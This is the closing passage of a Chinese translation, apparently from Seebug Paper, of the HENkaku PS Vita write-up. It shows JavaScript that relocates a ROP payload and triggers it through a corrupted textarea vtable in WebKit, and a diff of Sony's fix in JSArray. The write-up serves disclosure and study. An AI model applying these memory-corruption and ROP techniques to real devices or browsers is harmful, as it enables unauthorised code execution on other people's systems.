<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">,</span> <span class="o">++</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="nx">rop_header_and_data_size</span><span class="p">)</span>
        <span class="nx">addr</span> <span class="o">=</span> <span class="nx">rop_code_base</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="nx">relocs</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
        <span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
        <span class="k">break</span>
    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="nx">u32</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rop_data_base</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="cm">/*</span>
<span class="cm">        skipped most relocs</span>
<span class="cm">    */</span>
    <span class="k">default</span><span class="o">:</span>
        <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;wtf?&quot;</span><span class="p">);</span>
        <span class="nx">alert</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">relocs</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>在这个循环中，我们将有效 payload 分成两个部分：代码段和和数据段。我们不希望代码接触到数据，因为如果它们靠的太近，并且代码在数据之后（这是 roptool 生成的 ROP 链的情况），当调用函数时，它可能会损坏一部分数据段（记着栈增长的方向，这是 ROP 链所沿着的方向）。</p>
<p>因此一旦我们完成重定位数据段：<code>if (i == rop_header_and_data_size)</code> ，我们转向重定位代码段：<code>addr = rop_code_base / 4</code>.</p>
<p><img alt="" src="https://blog.xyz.is/assets/wk360-relocate-rop.svg" /></p>
<p>图片的左边是 ROP 链存储在 <code>payload</code> 数组中的样子。右边展示了 ROP 链是如何写入栈中的。</p>
<p>最后，我们来触发 ROP 链吧。</p>
<div class="codehilite"><pre><span></span><span class="c1">// 54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}</span>
<span class="nx">u32</span><span class="p">[</span><span class="nx">some_space</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x4e</span><span class="p">]</span> <span class="o">=</span> <span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0x54c8</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">ldm_data</span> <span class="o">=</span> <span class="nx">some_space</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="nx">u32</span><span class="p">[</span><span class="nx">ldm_data</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rop_code_base</span><span class="p">;</span>              <span class="c1">// sp</span>
<span class="nx">u32</span><span class="p">[</span><span class="nx">ldm_data</span><span class="o">/</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">SceWebKit_base</span> <span class="o">+</span> <span class="mh">0xc048a</span><span class="o">|</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// pc = pop {pc}</span>

<span class="c1">// This alert() is used to distinguish between the webkit exploit fail</span>
<span class="c1">// and second stage exploit fail</span>
<span class="c1">// - If you don&#39;t see it, the webkit exploit failed</span>
<span class="c1">// - If you see it and then the browser crashes, the second stage failed</span>
<span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Welcome to HENkaku!&quot;</span><span class="p">);</span>

<span class="nx">corrupted_textarea</span><span class="p">.</span><span class="nx">scrollLeft</span> <span class="o">=</span> <span class="nx">ldm_data</span><span class="p">;</span>         <span class="c1">// trigger ropchain, r1=arg</span>

<span class="c1">// You won&#39;t see this alert() unless something went terribly wrong</span>
<span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;that&#39;s it&quot;</span><span class="p">);</span>
</pre></div>


<p>当 <code>corrupted_textarea.scrollLeft = ldm_data</code> 完成时，由于覆盖了 vtable ，我们的 LDM gadget 将会被调用。<code>R1</code> 会变成 <code>ldm_data</code> ，因此它将从缓冲区加载 <code>SP = rop_code_base</code> 和 <code>PC = pop {pc}</code> ，这将会启动 ROP 链。</p>
<h3>Bonus: How Sony patched it</h3>
<p>索尼按照 LGPL 的要求定期上传他们的 Webkit 新源码到<a href="http://doc.dl.playstation.net/doc/psvita-oss/webkit.html">此页面</a>。（若是他们没有这么做，这种情况他们需要通过邮件要求一个友好的戳印）</p>
<p>将 3.60 和 3.61 版本之间的源码进行比较，将会发现以下内容（已省略无用的东西）：</p>
<div class="codehilite"><pre><span></span><span class="gh">diff -r 360/webkit_537_73/Source/JavaScriptCore/runtime/JSArray.cpp 361/webkit_537_73/Source/JavaScriptCore/runtime/JSArray.cpp</span>
1087,1096c1087,1123
<span class="gd">-     }</span>
<span class="gd">- };</span>
<span class="gd">- </span>
<span class="gd">- </span>
<span class="gd">- template&lt;IndexingType indexingType, typename StorageType&gt;</span>
<span class="gd">- void JSArray::sortCompactedVector(ExecState* exec, ContiguousData&lt;StorageType&gt; data, unsigned relevantLength)</span>
<span class="gd">- {</span>
<span class="gd">-     if (!relevantLength)</span>
<span class="gd">-         return;</span>
<span class="gd">-     </span>
<span class="gd">---</span>
<span class="gi">+     }</span>
<span class="gi">+ };</span>
<span class="gi">+ </span>
<span class="gi">+ template &lt;&gt;</span>
<span class="gi">+ ContiguousJSValues JSArray::storage&lt;ArrayWithInt32, WriteBarrier&lt;Unknown&gt; &gt;()</span>
<span class="gi">+ {</span>
<span class="gi">+     return m_butterfly-&gt;contiguousInt32();</span>
<span class="gi">+ }</span>
<span class="gi">+ </span>
<span class="gi">+ template &lt;&gt;</span>
<span class="gi">+ ContiguousDoubles JSArray::storage&lt;ArrayWithDouble, double&gt;()</span>
<span class="gi">+ {</span>
<span class="gi">+     return m_butterfly-&gt;contiguousDouble();</span>
<span class="gi">+ }</span>
<span class="gi">+ </span>
<span class="gi">+ template &lt;&gt;</span>
<span class="gi">+ ContiguousJSValues JSArray::storage&lt;ArrayWithContiguous, WriteBarrier&lt;Unknown&gt; &gt;()</span>
<span class="gi">+ {</span>
<span class="gi">+     return m_butterfly-&gt;contiguous();</span>
<span class="gi">+ }</span>
<span class="gi">+ </span>
<span class="gi">+ template &lt;&gt;</span>
<span class="gi">+ ContiguousJSValues JSArray::storage&lt;ArrayWithArrayStorage, WriteBarrier&lt;Unknown&gt; &gt;()</span>
<span class="gi">+ {</span>
<span class="gi">+     ArrayStorage* storage = m_butterfly-&gt;arrayStorage();</span>
<span class="gi">+     ASSERT(!storage-&gt;m_sparseMap);</span>
<span class="gi">+     return storage-&gt;vector();</span>
<span class="gi">+ }</span>
<span class="gi">+ </span>
<span class="gi">+ template&lt;IndexingType indexingType, typename StorageType&gt;</span>
<span class="gi">+ void JSArray::sortCompactedVector(ExecState* exec, ContiguousData&lt;StorageType&gt; data, unsigned relevantLength)</span>
<span class="gi">+ {</span>
<span class="gi">+     data = storage&lt;indexingType, StorageType&gt;();</span>
<span class="gi">+ </span>
<span class="gi">+     if (!relevantLength)</span>
<span class="gi">+         return;</span>
<span class="gi">+     </span>
1167,1172c1194,1200
<span class="gd">-         CRASH();</span>
<span class="gd">-     }</span>
<span class="gd">- </span>
<span class="gd">-     for (size_t i = 0; i &lt; relevantLength; i++)</span>
<span class="gd">-         ContiguousTypeAccessor&lt;indexingType&gt;::setWithValue(vm, this, data, i, values[i].first);</span>
<span class="gd">-     </span>
<span class="gd">---</span>
<span class="gi">+         CRASH();</span>
<span class="gi">+     }</span>
<span class="gi">+ </span>
<span class="gi">+     data = storage&lt;indexingType, StorageType&gt;();</span>
<span class="gi">+     for (size_t i = 0; i &lt; relevantLength; i++)</span>
<span class="gi">+         ContiguousTypeAccessor&lt;indexingType&gt;::setWithValue(vm, this, data, i, values[i].first);</span>
<span class="gi">+   </span>
</pre></div>


<p>他们现在在更新<code>data</code> 指针之前写入值。所以即使数组被重新分配，它仍然写入正确的内存。如果你尝试在在 3.61 版本上运行 HENkaku，这就是造成<code>alert("restart the browser")</code>错误的原因。干的漂亮，Sony！</p>
<h3>Conclusion</h3>
<p>今天就这些！我希望你能喜欢这个 writeup，就像我讨厌写 exploit 一样。此后，在几个月/年/世纪，我会带给你一些更好的 writeup ，尽请期待。因为我写了大部分的 HENkaku exploit 链，我被禁止参加 <a href="https://yifan.lu/2016/08/05/henkaku-koth-challenge">KOTH challenge</a> :(，但至少你可以享受这篇writeup :)。</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/98/">https://paper.seebug.org/98/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/97/"><span aria-hidden="true">&larr;</span> Pwn A Camera Step by Step (...</a>
    
    
      <a class="older-posts" href="/100/">从“方程式”到“方程组” EQUATION攻击组织高级... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
